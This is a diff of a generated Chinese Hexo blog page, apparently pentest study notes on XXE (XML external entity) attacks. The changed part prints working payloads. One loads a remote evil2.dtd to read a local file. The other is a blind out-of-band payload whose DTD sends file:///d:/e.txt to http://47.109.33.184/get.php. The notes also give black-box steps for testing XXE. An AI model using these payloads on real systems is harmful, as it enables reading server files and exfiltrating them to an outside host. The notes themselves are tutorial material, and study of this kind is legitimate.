@@ -66,9 +66,9 @@
         })();
     </script>
 
-<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Shmily的博客" type="application/atom+xml">
-
+<meta name="generator" content="Hexo 6.1.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Shmily的博客" type="application/atom+xml">
 </head>
 
 <body>
@@ -473,14 +473,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    498
+                    600
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
                 
@@ -502,28 +502,40 @@
 <p>利用xml写一个带有文件读取的代码尝试发送，类似文件读取功能实现</p>
 <p>无回显：要利用带外测试（利用dnslog来做测试！） </p>
 <p>实体引用：引用远程的evil2.dtd文件</p>
-<h5 id="1-解决拦截防护绕过问题"><a href="#1-解决拦截防护绕过问题" class="headerlink" title="1.解决拦截防护绕过问题"></a>1.解决拦截防护绕过问题</h5><!--?xml version="1.0" ?-->
+<h5 id="1-解决拦截防护绕过问题"><a href="#1-解决拦截防护绕过问题" class="headerlink" title="1.解决拦截防护绕过问题"></a>1.解决拦截防护绕过问题</h5><pre><code>&lt;?xml version="1.0" ?&gt;
 
+&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM "http://127.0.0.1:8081/evil2.dtd"&gt;
 
+​    %file;
 
-<p>​    %file;</p>
-<p>]&gt;</p>
-<p><user><username>&amp;send;</username><password>Mikasa</password></user></p>
+]&gt;
+
+&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;
+</code></pre>
 <p>evil2.dtd ：该文件读取d:e.txt的内容</p>
-<!--ENTITY send SYSTEM "file:///d:/e.txt"-->
+<pre><code>&lt;!ENTITY send SYSTEM "file:///d:/e.txt"&gt;
 
-<h5 id="2-解决数据不回显的问题"><a href="#2-解决数据不回显的问题" class="headerlink" title="2.解决数据不回显的问题"></a>2.解决数据不回显的问题</h5><!--?xml version="1.0"?-->
+##### 2.解决数据不回显的问题
+</code></pre>
+<pre><code>&lt;?xml version="1.0"?&gt;
 
+&lt;!DOCTYPE ANY[
 
+&lt;!ENTITY % file SYSTEM "file:///d:/e.txt"&gt;
 
-<!--ENTITY % remote SYSTEM "http://47.109.33.184/test.dtd"-->
+&lt;!ENTITY % remote SYSTEM "http://47.109.33.184/test.dtd"&gt;
 
-<p>%remote;</p>
-<p>%all;</p>
-<p>]&gt;</p>
-<p><root>&amp;send;</root></p>
+%remote;
+
+%all;
+
+]&gt;
+
+&lt;root&gt;&amp;send;&lt;/root&gt;
+</code></pre>
 <p>test.dtd</p>
-<!--ENTITY % all "<!ENTITY send SYSTEM 'http://47.109.33.184/get.php?file=%file;'--><p>“&gt;</p>
+<pre><code>&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://47.109.33.184/get.php?file=%file;'&gt;"&gt;
+</code></pre>
 <h5 id="XXE黑盒发现："><a href="#XXE黑盒发现：" class="headerlink" title="XXE黑盒发现："></a>XXE黑盒发现：</h5><p>1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</p>
 <p>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</p>
 <p>流程：功能分析-前端提交-源码&amp;抓包-构造Paylod测试</p>
@@ -1240,7 +1252,7 @@
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">1.3k</span>
+            <span class="white-color">1.4k</span>
             
 
             <br>
